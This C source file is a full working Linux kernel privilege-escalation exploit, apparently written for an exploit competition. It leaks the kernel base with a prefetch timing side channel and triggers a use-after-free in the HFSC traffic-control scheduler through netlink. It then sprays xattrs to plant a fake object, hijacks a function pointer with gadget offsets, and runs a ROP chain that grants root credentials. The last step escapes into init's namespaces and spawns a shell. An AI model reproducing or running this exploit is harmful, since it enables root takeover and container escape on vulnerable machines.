#define _GNU_SOURCE
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sched.h>
#include <errno.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/xattr.h>
#include <sys/syscall.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_cls.h>
#include <linux/pkt_sched.h>
#include <linux/if_arp.h>

/* Prefetch kaslr leak */
#define MIN_STEXT 0xffffffff81000000
#define MAX_STEXT 0xffffffffbb000000
#define BASE_INC 0x1000000
#define SYS_GETUID 0x1a7440

#define KASLR_START 0xffffffff81000000ull
#define KASLR_END   0xffffffffc0000000ull
#define KASLR_SLOT_SIZE 0x200000ull
#define KASLR_MAX_ATTEMPTS 5


/* simple_xattr spray */
#define XATTR_SPRAY 32
#define XATTR_HEADER_SIZE 32
#define XATTR_SLAB_LEN 1024
#define XATTR_DATA_LEN (XATTR_SLAB_LEN/2)

/* hfsc_class offsets */
#define LEVEL_OFFSET 100
#define CL_PARENT_OFFSET 112
#define VT_NODE_OFFSET 192
#define CF_NODE_OFFSET 224
#define CL_VT_OFFSET 280
#define CL_CVTMIN_OFFSET 312

/* Data offsets */
#define INIT_NSPROXY 0x26765c0
#define QFQ_CHANGE_QDISC_LOC 0x295d438

/* Function offsets */
#define PREPARE_KERNEL_CRED 0x1befb0
#define COMMIT_CREDS 0x1bed10
#define FIND_TASK_BY_VPID 0x1b5600
#define SWITCH_TASK_NAMESPACES 0x1bd180

/* Gadget offsets */
#define PUSH_RSI_JMP_QWORD_PTR_RSI_MINUS_0x70 0xdf26ac
#define PUSH_RDI_POP_RBX_POP_RBP_RET_THUNK 0x09e7eb
#define POP_RSP_POP_RBX_RET_THUNK 0x357c79
#define POP_RDI_RET_THUNK 0x088893
#define POP_RSI_RET_THUNK 0x0d88a3
#define POP_RDX_RET_THUNK 0x047e72
#define POP_RCX_RET_THUNK 0x0271ec
#define MOV_RDI_RAX_THUNK_RCX 0x817ea9
#define ADD_RAX_RCX_RET_THUNK 0x0d5f84
#define PUSH_RAX_JMP_RDX_THUNK 0x94dca7
#define POP_RSP_RET_THUNK 0x068961
#define MOV_RAX_R14_POP_R14_RET_THUNK 0xa210ac
#define POP_R14_RET_THUNK 0x0d88a2

#define err_exit(s) do { perror(s); exit(EXIT_FAILURE); } while(0)

struct tf_msg {
    struct nlmsghdr nh;
    struct tcmsg tm;
#define TC_DATA_LEN 512
    char attrbuf[TC_DATA_LEN];
};

struct if_msg {
    struct nlmsghdr nh;
    struct ifinfomsg ifi;
};

/* Netlink message for setting loopback up. */
struct if_msg if_up_msg = {
    {
        .nlmsg_len = 32,
        .nlmsg_type = RTM_NEWLINK,
        .nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
    },
    {
        .ifi_family = AF_UNSPEC,
        .ifi_type = ARPHRD_NETROM,
        .ifi_index = 1,
        .ifi_flags = IFF_UP,
        .ifi_change = 1,
    },

};


int xattr_fd;
char rop_buf[512];
char jop_buf[0x70];

void pin_cpu (int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set))
        err_exit("[-] sched_setaffinity");
}


/* Debug logging buffer */
char debug_buf[256 * 1024];
size_t debug_buf_pos = 0;

void log_debug(const char *fmt, ...) {
    if (debug_buf_pos >= sizeof(debug_buf) - 1) return;
    va_list args;
    va_start(args, fmt);
    debug_buf_pos += vsnprintf(debug_buf + debug_buf_pos, sizeof(debug_buf) - debug_buf_pos, fmt, args);
    va_end(args);
}

// /*
//  * Prefetch timing code from Daniel Gruss.
//  * https://github.com/IAIK/prefetch
//  */

// inline __attribute__((always_inline)) size_t rdtsc_begin () {
//   size_t a, d;
//   asm volatile (
//     "mfence\n\t"
//     "RDTSCP\n\t"
//     "mov %%rdx, %0\n\t"
//     "mov %%rax, %1\n\t"
//     "xor %%rax, %%rax\n\t"
//     "mfence\n\t"
//     : "=r" (d), "=r" (a)
//     :
//     : "%rax", "%rbx", "%rcx", "%rdx");
//   a = (d<<32) | a;
//   return a;
// }

// inline __attribute__((always_inline)) size_t rdtsc_end () {
//   size_t a, d;
//   asm volatile(
//     "xor %%rax, %%rax\n\t"
//     "mfence\n\t"
//     "RDTSCP\n\t"
//     "mov %%rdx, %0\n\t"
//     "mov %%rax, %1\n\t"
//     "mfence\n\t"
//     : "=r" (d), "=r" (a)
//     :
//     : "%rax", "%rbx", "%rcx", "%rdx");
//   a = (d<<32) | a;
//   return a;
// }

// void prefetch (void* p) {
//     asm volatile ("prefetchnta (%0)" : : "r" (p));
//     asm volatile ("prefetcht2 (%0)" : : "r" (p));
// }

// size_t onlyreload (void* addr) {
//     size_t time = rdtsc_begin();
//     prefetch(addr);
//     size_t delta = rdtsc_end() - time;
//     return delta;
// }

// /*
//  * Simple implementation of prefetch sidechannel to
//  * bypass KASLR.
//  */

inline __attribute__((always_inline)) uint64_t rdtsc_begin() {
	uint64_t a, d;
	asm volatile ("mfence\n\t"
		"RDTSCP\n\t"
		"mov %%rdx, %0\n\t"
		"mov %%rax, %1\n\t"
		"xor %%rax, %%rax\n\t"
		"lfence\n\t"
		: "=r" (d), "=r" (a)
		:
		: "%rax", "%rbx", "%rcx", "%rdx");
	a = (d<<32) | a;
	return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end() {
	uint64_t a, d;
	asm volatile(
		"xor %%rax, %%rax\n\t"
		"lfence\n\t"
		"RDTSCP\n\t"
		"mov %%rdx, %0\n\t"
		"mov %%rax, %1\n\t"
		"mfence\n\t"
		: "=r" (d), "=r" (a)
		:
		: "%rax", "%rbx", "%rcx", "%rdx");
	a = (d<<32) | a;
	return a;
}

void prefetch(void* p)
{
	asm volatile (
	"prefetchnta (%0)\n"
	"prefetcht2 (%0)\n"
	: : "r" (p));
}

size_t flushandreload(void* addr) // row miss
{
	size_t time = rdtsc_begin();
	prefetch(addr);
	size_t delta = rdtsc_end() - time;
	return delta;
}

int compare_uint64(const void* a, const void* b) {
    uint64_t ua = *(const uint64_t*)a;
    uint64_t ub = *(const uint64_t*)b;
    return (ua > ub) - (ua < ub);
}

uint64_t compute_median(uint64_t* data, size_t size) {
    if (size == 0) return 0;
    qsort(data, size, sizeof(uint64_t), compare_uint64);
    return data[size / 2];
}

uint64_t slot_to_addr(size_t slot) {
    return KASLR_START + slot * KASLR_SLOT_SIZE;
}

int try_find_edge(uint64_t* timings, size_t size, uint64_t* found_slot) {
    if (size == 0) return 0;

    uint64_t *sorted_timings = malloc(size * sizeof(uint64_t));
    if (!sorted_timings) return 0;
    memcpy(sorted_timings, timings, size * sizeof(uint64_t));

    uint64_t median = compute_median(sorted_timings, size);
    free(sorted_timings);
    
    uint64_t max_diff = 0;

    for (size_t i = 0; i < size; i++) {
        uint64_t diff = (timings[i] > median) ? (timings[i] - median) : (median - timings[i]);
        if (diff > max_diff) {
            max_diff = diff;
        }
    }
    
    // Dynamic Threshold: max_diff / 2
    uint64_t threshold = max_diff / 2;

    for (size_t i = 0; i < size; i++) {
        uint64_t diff = (timings[i] > median) ? (timings[i] - median) : (median - timings[i]);
        if (diff >= threshold) {
            *found_slot = slot_to_addr(i);
            return 1;
        }
    }
    return 0;
}

typedef struct {
    int has_value;
    uint64_t value;
    uint64_t* timings; // allocated
    size_t timings_len;
} try_leak_result_t;

try_leak_result_t try_leak_kaslr_base(int samples) {
    size_t slots = (KASLR_END - KASLR_START) / KASLR_SLOT_SIZE;
    try_leak_result_t result = {0, 0, NULL, slots};
    
    // We allocate flat arrays to simulate vector<vector<uint64_t>>
    // accessing as all_timings[slot * samples + sample_idx]
    uint64_t *all_timings = malloc(slots * samples * sizeof(uint64_t));
    if (!all_timings) return result;

    for (int i = 0; i < samples; i++) {
        for (size_t slot = 0; slot < slots; slot++) {
            uint64_t addr = slot_to_addr(slot);
            uint64_t timing = flushandreload((void*)addr);
            all_timings[slot * samples + i] = timing;
        }
    }

    result.timings = malloc(slots * sizeof(uint64_t));
    if (!result.timings) {
        free(all_timings);
        return result;
    }

    uint64_t *slot_samples = malloc(samples * sizeof(uint64_t));
    if (!slot_samples) {
        free(all_timings);
        free(result.timings);
        result.timings = NULL;
        return result;
    }

    for (size_t slot = 0; slot < slots; slot++) {
        for (int i = 0; i < samples; i++) {
            slot_samples[i] = all_timings[slot * samples + i];
        }
        result.timings[slot] = compute_median(slot_samples, samples);
        log_debug("[DEBUG] Prob: %lx Time: %lu\n", slot_to_addr(slot), result.timings[slot]);
    }

    free(slot_samples);
    free(all_timings);

    if (try_find_edge(result.timings, slots, &result.value)) {
        result.has_value = 1;
    }

    return result;
}

int find_majority(uint64_t* candidates, int count, uint64_t* result) {
    uint64_t candidate = 0;
    int vote_count = 0;
    int has_candidate = 0;

    for (int i = 0; i < count; i++) {
        // candidates[i] == 0 is considered "nullopt" failure in this context
        // The original logic treats "first valid" as init.
        if (candidates[i] == 0) continue; 

        if (vote_count == 0) {
            candidate = candidates[i];
            vote_count = 1;
            has_candidate = 1;
        } else {
            if (candidates[i] == candidate) {
                vote_count++;
            } else {
                vote_count--;
            }
        }
    }

    if (!has_candidate) return 0;

    size_t actual_count = 0;
    for (int i = 0; i < count; i++) {
        if (candidates[i] != 0 && candidates[i] == candidate) {
            actual_count++;
        }
    }

    if (actual_count > count / 2) {
        *result = candidate;
        return 1;
    }
    return 0;
}

uint64_t leak_kaslr_base(int samples, int trials, void* debug_data) {
    uint64_t *candidates = calloc(trials, sizeof(uint64_t)); // Using 0 as nullopt
    if (!candidates) return 0;

    for (int attempt = 0; attempt < KASLR_MAX_ATTEMPTS; attempt++) {
        for (int trial = 0; trial < trials; trial++) {
            try_leak_result_t res = try_leak_kaslr_base(samples);
            
            if (res.has_value) {
                candidates[trial] = res.value;
                log_debug("[DEBUG] Vote %d: Found base 0x%lx\n", trial, res.value);
            } else {
                candidates[trial] = 0;
                log_debug("[DEBUG] Vote %d: Failed to find base\n", trial);
            }

            if (res.timings) {
                free(res.timings);
            }
        }
        
        uint64_t majority = 0;
        if (find_majority(candidates, trials, &majority)) {
             free(candidates);
             return majority;
        }
    }
    
    free(candidates);
    // throw ExpKitError("Failed to leak KASLR base") -> return 0
    return 0;
}


void init_rop (long *rop, long *jop, long kbase) {
    *jop++ = kbase + POP_RSP_POP_RBX_RET_THUNK;
    /* restore rbx */
    *rop++ = kbase + PUSH_RDI_POP_RBX_POP_RBP_RET_THUNK;
    *rop++ = 0;
    /* commit_creds(prepare_kernel_cred(0)) */
    *rop++ = kbase + POP_RDI_RET_THUNK;
    *rop++ = 0;
    *rop++ = kbase + PREPARE_KERNEL_CRED;
    *rop++ = kbase + POP_RCX_RET_THUNK;
    *rop++ = kbase + COMMIT_CREDS;
    *rop++ = kbase + MOV_RDI_RAX_THUNK_RCX;
    /* switch_task_namespaces(find_task_by_vpid(1, init_ns_proxy) */
    *rop++ = kbase + POP_RDI_RET_THUNK;
    *rop++ = 1;
    *rop++ = kbase + FIND_TASK_BY_VPID;
    *rop++ = kbase + POP_RSI_RET_THUNK;
    *rop++ = kbase + INIT_NSPROXY;
    *rop++ = kbase + POP_RCX_RET_THUNK;
    *rop++ = kbase + SWITCH_TASK_NAMESPACES;
    *rop++ = kbase + MOV_RDI_RAX_THUNK_RCX;
    /* return back to the original stack */
    *rop++ = kbase + MOV_RAX_R14_POP_R14_RET_THUNK;
    *rop++ = 0;
    *rop++ = kbase + POP_RDX_RET_THUNK;
    *rop++ = kbase + POP_R14_RET_THUNK;
    *rop++ = kbase + PUSH_RAX_JMP_RDX_THUNK;
    *rop++ = kbase + POP_RCX_RET_THUNK;
    *rop++ = (long)-384;
    *rop++ = kbase + ADD_RAX_RCX_RET_THUNK;
    *rop++ = kbase + POP_RDX_RET_THUNK;
    *rop++ = kbase + POP_RSP_RET_THUNK;
    *rop++ = kbase + PUSH_RAX_JMP_RDX_THUNK;
}

/* Helper functions for creating rtnetlink messages. */

unsigned short add_rtattr (struct rtattr *rta, unsigned short type, unsigned short len, char *data) {
    rta->rta_type = type;
    rta->rta_len = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    return rta->rta_len;
}

int vuln_class_id = 0x00010001; // 1:1, classid of vulnerable RSC parent.
int def_class_id = 0x00010002; // 1:2, classid where packets are enqueued.
struct tf_msg newqd_msg, delc_msg, new_rsc_msg, new_fsc_msg, new_qfq_qdisc;

void init_tf_msg (struct tf_msg *m) {
    m->nh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    m->tm.tcm_family = PF_UNSPEC;
    m->tm.tcm_ifindex = if_nametoindex("lo");
    m->nh.nlmsg_len = NLMSG_LENGTH(sizeof(m->tm));
}

void init_qdisc_msg (struct tf_msg *m) {
    init_tf_msg(m);
    m->nh.nlmsg_type = RTM_NEWQDISC;
    m->tm.tcm_parent = -1;
    m->tm.tcm_handle = 1 << 16;
    m->nh.nlmsg_flags |= NLM_F_CREATE;
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len), TCA_KIND, strlen("hfsc") + 1, "hfsc"));
    struct rtattr *opts = (char *)m + NLMSG_ALIGN(m->nh.nlmsg_len);
    short def = 2;
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len), TCA_OPTIONS, 2, &def));
}


void init_rsc_class_msg (struct tf_msg *m) {
    init_tf_msg(m);
    m->nh.nlmsg_type = RTM_NEWTCLASS;
    m->tm.tcm_parent = 1 << 16;
    m->tm.tcm_handle = vuln_class_id;
    m->nh.nlmsg_flags |= NLM_F_CREATE;
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len), TCA_KIND, strlen("hfsc") + 1, "hfsc"));
    struct rtattr *opts = (char *)m + NLMSG_ALIGN(m->nh.nlmsg_len);
    opts->rta_type = TCA_OPTIONS;
    opts->rta_len = RTA_LENGTH(0);
    int rsc[3] = {1, 1, 1};
    opts->rta_len += RTA_ALIGN(add_rtattr((char *)opts + opts->rta_len, TCA_HFSC_RSC, sizeof(rsc), rsc));
    m->nh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
}

void init_fsc_class_msg (struct tf_msg *m) {
    init_tf_msg(m);
    m->nh.nlmsg_type = RTM_NEWTCLASS;
    m->tm.tcm_parent = vuln_class_id;
    m->tm.tcm_handle = def_class_id;
    m->nh.nlmsg_flags |= NLM_F_CREATE;
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len), TCA_KIND, strlen("hfsc") + 1, "hfsc"));
    struct rtattr *opts = (char *)m + NLMSG_ALIGN(m->nh.nlmsg_len);
    opts->rta_type = TCA_OPTIONS;
    opts->rta_len = RTA_LENGTH(0);
    int fsc[3] = {1, 1, 1};
    opts->rta_len += RTA_ALIGN(add_rtattr((char *)opts + opts->rta_len, TCA_HFSC_FSC, sizeof(fsc), fsc));
    m->nh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
}

void init_del_class_msg (struct tf_msg *m) {
    init_tf_msg(m);
    m->nh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    m->nh.nlmsg_type = RTM_DELTCLASS;
    m->tm.tcm_handle = vuln_class_id;
}

void init_qfq_qdisc_msg (struct tf_msg *m) {
    init_tf_msg(m);
    m->nh.nlmsg_type = RTM_NEWQDISC;
    m->tm.tcm_parent = 0x00010002;
    m->tm.tcm_handle = 2 << 16;
    m->nh.nlmsg_flags |= NLM_F_CREATE;
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len), TCA_KIND, strlen("qfq") + 1, "qfq"));
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len), TCA_OPTIONS, sizeof(jop_buf), jop_buf));
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len), TCA_OPTIONS, sizeof(rop_buf), rop_buf));
}

void init_nl_msgs (void) {
    init_qdisc_msg(&newqd_msg);
    init_del_class_msg(&delc_msg);
    init_rsc_class_msg(&new_rsc_msg);
    init_fsc_class_msg(&new_fsc_msg);
}

/*
 * Send a Netlink message and check for error
 */
void netlink_write (int sock, struct tf_msg *m) {
    struct {
        struct nlmsghdr nh;
        struct nlmsgerr ne;
    } ack;
    if (write(sock, m, m->nh.nlmsg_len) == -1)
        err_exit("[-] write");
    if (read(sock , &ack, sizeof(ack)) == -1)
        err_exit("[-] read");
    if (ack.ne.error) {
        errno = -ack.ne.error;
        perror("[-] netlink");
    }
}

void netlink_write_noerr (int sock, struct tf_msg *m) {
    if (write(sock, m, m->nh.nlmsg_len) == -1)
        err_exit("[-] write");
}

/*
 * Allocate simple_xattr objects.
 */
int num_xattr = 0;
char xattr_buf[XATTR_DATA_LEN];
void spray_simple_xattrs(int num_spray) {
    char name[32];
    for (int i = 0; i < num_spray; i++, num_xattr++) {
        sprintf(name, "security.%d", num_xattr);
        if (fsetxattr(xattr_fd, name, xattr_buf, XATTR_DATA_LEN, 0) == -1)
            err_exit("[-] fsetxattr");
    }
}

/*
 * Send a message on the loopback device. Used to trigger qdisc enqueue and
 * dequeue functions.
 */
void loopback_send (void) {
    struct sockaddr iaddr = { AF_INET };
    int inet_sock_fd = socket(PF_INET, SOCK_DGRAM, 0);
    if (inet_sock_fd == -1)
        err_exit("[-] inet socket");
    if (connect(inet_sock_fd, &iaddr, sizeof(iaddr)) == -1)
        err_exit("[-] connect");
    if (write(inet_sock_fd, "", 1) == -1)
        err_exit("[-] inet write");
    close(inet_sock_fd);
}

int main (int argc, char **argv) {
    long kernel_base;

    pin_cpu(0);

    /* Get kernel base from command line or prefetch side channel */
    
    // Always perform leak verification unless explicitly disabled (not implemented here)
    printf("[*] Using prefetch to leak kernel base...\n");
    getuid();
    // long leaked_base = kaslr_leak(1000, 1000);
    // long leaked_base = bypass_kaslr(0);
    // leak_kaslr_base(int samples, int trials, void* debug_data)
    long leaked_base = leak_kaslr_base(100, 7, NULL);
    printf("LEAK: %lx\n", leaked_base);

    if (argc > 1) {
        long provided_base = strtoul(argv[1], NULL, 16);
        printf("[*] Comparing leaked base against provided base: %lx\n", provided_base);
        if (leaked_base != provided_base) {
             printf("[-] FAILURE: Leak mismatch! Expected %lx, got %lx\n", provided_base, leaked_base);
             printf("[DEBUG] Log Dump:\n%s\n", debug_buf);
             // We want to see this failure in logs.
             // If we exit here, repro.sh fails (no flag). 
             // This is good for statistics.
             exit(EXIT_FAILURE); 
        }
        printf("[+] SUCCESS: Leak matches provided base.\n");
        exit(EXIT_SUCCESS); 
    } else {
        if (leaked_base == -1) {
            printf("[*] Prefetch failed\n");
            exit(EXIT_FAILURE);
        }
        kernel_base = leaked_base;
        printf("[*] Leaked kernel base: %p\n", kernel_base);
    }

    if (unshare(CLONE_NEWUSER) == -1)
        err_exit("[-] unshare(CLONE_NEWUSER)");
    if (unshare(CLONE_NEWNET) == -1)
        err_exit("[-] unshare(CLONE_NEWNET)");

    /* Open temporary file to use for xattr spray */
    xattr_fd = open("/tmp/", O_TMPFILE | O_RDWR, 0664);
    if (xattr_fd == -1)
        err_exit("[-] open");

    /* Open socket to send netlink commands to */
    int nl_sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (nl_sock_fd == -1)
        err_exit("[-] nl socket");

    /* Set loopback device up */
    if_up_msg.ifi.ifi_index = if_nametoindex("lo");
    netlink_write(nl_sock_fd, &if_up_msg);

    init_nl_msgs();

    /* Trigger vuln */
    netlink_write(nl_sock_fd, &newqd_msg);
    netlink_write(nl_sock_fd, &new_rsc_msg);
    netlink_write(nl_sock_fd, &new_fsc_msg);
    loopback_send();
    delc_msg.tm.tcm_handle = def_class_id;
    netlink_write(nl_sock_fd, &delc_msg);

    printf("[*] Triggered vulnerability\n");

    /* Place fake hfsc_class in xattr */

    /* hfsc_class.level = 1 (must be non-zero) */
    xattr_buf[LEVEL_OFFSET - XATTR_HEADER_SIZE] = 1;
    /* hfsc_class.vt_node = 1 (must be odd) */
    xattr_buf[VT_NODE_OFFSET - XATTR_HEADER_SIZE] = 1;
    /* hfsc_class.cf_node = 1 (must be odd) */
    xattr_buf[CF_NODE_OFFSET - XATTR_HEADER_SIZE] = 1;
    /* hfsc_class.parent = &qfq_change_qdisc (write target)*/
    long parent = kernel_base + QFQ_CHANGE_QDISC_LOC - CL_CVTMIN_OFFSET;
    memcpy(xattr_buf + CL_PARENT_OFFSET - XATTR_HEADER_SIZE, &parent, 8);
    /* hfsc_class.cl_vt = jop_gadget (write value) */
    long cl_vt = kernel_base + PUSH_RSI_JMP_QWORD_PTR_RSI_MINUS_0x70;
    memcpy(xattr_buf + CL_VT_OFFSET - XATTR_HEADER_SIZE, &cl_vt, 8);

    printf("[*] Spraying simple_xattrs...\n");
    /* Spray simple_xattrs */
    delc_msg.tm.tcm_handle = vuln_class_id;
    netlink_write(nl_sock_fd, &delc_msg);
    spray_simple_xattrs(XATTR_SPRAY);

    /* Create new default class and trigger enqueue/dequeue to overwrite
     * qfq_change_qdisc with jop gadget */
    new_fsc_msg.tm.tcm_parent = 1 << 16;
    netlink_write(nl_sock_fd, &new_fsc_msg);

    printf("[*] Overwriting function pointer\n");
    loopback_send();

    /* Prepare ROP chain at an offset of 4 bytes. With the 4-byte rtattr 
    header it will be at an 8-byte offset from rsi, allowing it to be reached 
    with `push rsi ; pop rsp ; pop rbx` for the stack pivot */
    init_rop(rop_buf + 4, jop_buf, kernel_base);

    /* Create QFQ qdisc */
    init_qfq_qdisc_msg(&new_qfq_qdisc);
    netlink_write_noerr(nl_sock_fd, &new_qfq_qdisc);

    /* Call overwritten function pointer */
    printf("[*] Triggering ROP chain\n");
    netlink_write_noerr(nl_sock_fd, &new_qfq_qdisc);

    if (getuid()) {
        printf("[-] Privesc failed\n");
        exit(EXIT_FAILURE);
    }

    printf("[+] Returned from ROP\n");

    int mntns_fd = open("/proc/1/ns/mnt", O_RDONLY);
    if (mntns_fd == -1)
        perror("[-] open(/proc/1/ns/mnt)");

    int netns_fd = open("/proc/1/ns/net", O_RDONLY);
    if (netns_fd == -1)
        perror("[-] open(/proc/1/ns/net)");

    int pidns_fd = open("/proc/1/ns/pid", O_RDONLY);
    if (pidns_fd == -1)
        perror("[-] open(/proc/1/ns/pid)");

    if (setns(mntns_fd, CLONE_NEWNS) == -1)
        perror("[-] setns mnt");
    if (setns(netns_fd, CLONE_NEWNET) == -1)
        perror("[-] setns net");
    if (setns(pidns_fd, CLONE_NEWPID) == -1)
        perror("[-] setns pid");

    printf("[*] Launching shell\n");
    system("/bin/sh");
}
